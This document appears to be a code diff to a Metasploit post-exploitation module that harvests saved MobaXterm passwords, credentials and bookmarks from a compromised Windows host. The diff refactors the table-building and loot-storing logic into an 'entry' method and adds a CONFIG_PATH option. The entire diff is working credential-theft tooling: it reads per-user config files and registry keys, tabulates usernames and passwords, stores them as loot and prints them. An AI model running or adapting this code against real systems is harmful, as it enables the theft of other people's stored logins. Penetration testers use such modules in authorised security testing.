@@ -271,77 +271,92 @@ class MetasploitModule < Msf::Post
     return result
   end
 
+  def entry(config)
+    pws_result = gather_password(config)
+    columns = [
+      'Protocol',
+      'Hostname',
+      'Username',
+      'Password',
+    ]
+    pw_tbl = Rex::Text::Table.new(
+      'Header' => 'MobaXterm Password',
+      'Columns' => columns
+    )
+    pws_result.each do |item|
+      pw_tbl << item.values
+    end
+    creds_result = gather_creds(config)
+    columns = [
+      'CredentialsName',
+      'Username',
+      'Password',
+    ]
+    creds_tbl = Rex::Text::Table.new(
+      'Header' => 'MobaXterm Credentials',
+      'Columns' => columns
+    )
+    creds_result.each do |item|
+      creds_tbl << item.values
+    end
+    bookmarks_result = parse_bookmarks(config['Bookmarks'])
+    columns = [
+      'BookmarksName',
+      'Protocol',
+      'ServerHost',
+      'Port',
+      'Credentials or Passwords',
+    ]
+    bookmarks_tbl = Rex::Text::Table.new(
+      'Header' => 'MobaXterm Bookmarks',
+      'Columns' => columns
+    )
+    bookmarks_result.each do |item|
+      bookmarks_tbl << item.values
+    end
+    if pw_tbl.rows.count
+      path = store_loot('host.moba_xterm', 'text/plain', session, pw_tbl, 'moba_xterm.txt', 'MobaXterm Password')
+      print_good("Passwords stored in: #{path}")
+      print_good(pw_tbl.to_s)
+    end
+    if creds_tbl.rows.count
+      path = store_loot('host.moba_xterm', 'text/plain', session, creds_tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
+      print_good("Credentials stored in: #{path}")
+      print_good(creds_tbl.to_s)
+    end
+    if bookmarks_tbl.rows.count
+      path = store_loot('host.moba_xterm', 'text/plain', session, bookmarks_tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
+      print_good("Bookmarks stored in: #{path}")
+      print_good(bookmarks_tbl.to_s)
+    end
+  end
+
   def run
     print_status("Gathering MobaXterm session information from #{sysinfo['Computer']}")
-    session_p = 0
+    if datastore['CONFIG_PATH']
+      ini_config_path = datastore['CONFIG_PATH']
+      print_status("Specifies the config file path for MobaXterm #{ini_config_path}")
+      config = parser_ini(ini_config_path)
+      if !config
+        return
+      end
+
+      parent_key = "HKEY_USERS\\#{session.sys.config.getsid}\\Software\\Mobatek\\MobaXterm"
+      config['RegistryKey'] = parent_key
+      entry(config)
+      return
+    end
+
     grab_user_profiles.each do |user|
       next if user['AppData'].nil?
 
       ini_config_path = "#{user['MyDocs']}\\MobaXterm\\MobaXterm.ini"
-      ini_config_path = datastore['CONFIG_PATH'] if datastore['CONFIG_PATH']
       config = parser_ini(ini_config_path)
       next if !config
 
       parent_key = "HKEY_USERS\\#{user['SID']}\\Software\\Mobatek\\MobaXterm"
       config['RegistryKey'] = parent_key
-      session_p = registry_getvaldata(parent_key, 'SessionP') if registry_key_exist?(parent_key)
-      pws_result = gather_password(config)
-      columns = [
-        'Protocol',
-        'Hostname',
-        'Username',
-        'Password',
-      ]
-      pw_tbl = Rex::Text::Table.new(
-        'Header' => 'MobaXterm Password',
-        'Columns' => columns
-      )
-      pws_result.each do |item|
-        pw_tbl << item.values
-      end
-      creds_result = gather_creds(config)
-      columns = [
-        'CredentialsName',
-        'Username',
-        'Password',
-      ]
-      creds_tbl = Rex::Text::Table.new(
-        'Header' => 'MobaXterm Credentials',
-        'Columns' => columns
-      )
-      creds_result.each do |item|
-        creds_tbl << item.values
-      end
-      bookmarks_result = parse_bookmarks(config['Bookmarks'])
-      columns = [
-        'BookmarksName',
-        'Protocol',
-        'ServerHost',
-        'Port',
-        'Credentials or Passwords',
-      ]
-      bookmarks_tbl = Rex::Text::Table.new(
-        'Header' => 'MobaXterm Bookmarks',
-        'Columns' => columns
-      )
-      bookmarks_result.each do |item|
-        bookmarks_tbl << item.values
-      end
-      if pw_tbl.rows.count
-        path = store_loot('host.moba_xterm', 'text/plain', session, pw_tbl, 'moba_xterm.txt', 'MobaXterm Password')
-        print_good("Passwords stored in: #{path}")
-        print_good(pw_tbl.to_s)
-      end
-      if creds_tbl.rows.count
-        path = store_loot('host.moba_xterm', 'text/plain', session, creds_tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
-        print_good("Credentials stored in: #{path}")
-        print_good(creds_tbl.to_s)
-      end
-      next unless bookmarks_tbl.rows.count
-
-      path = store_loot('host.moba_xterm', 'text/plain', session, bookmarks_tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
-      print_good("Bookmarks stored in: #{path}")
-      print_good(bookmarks_tbl.to_s)
+      entry(config)
     end
   end
 end
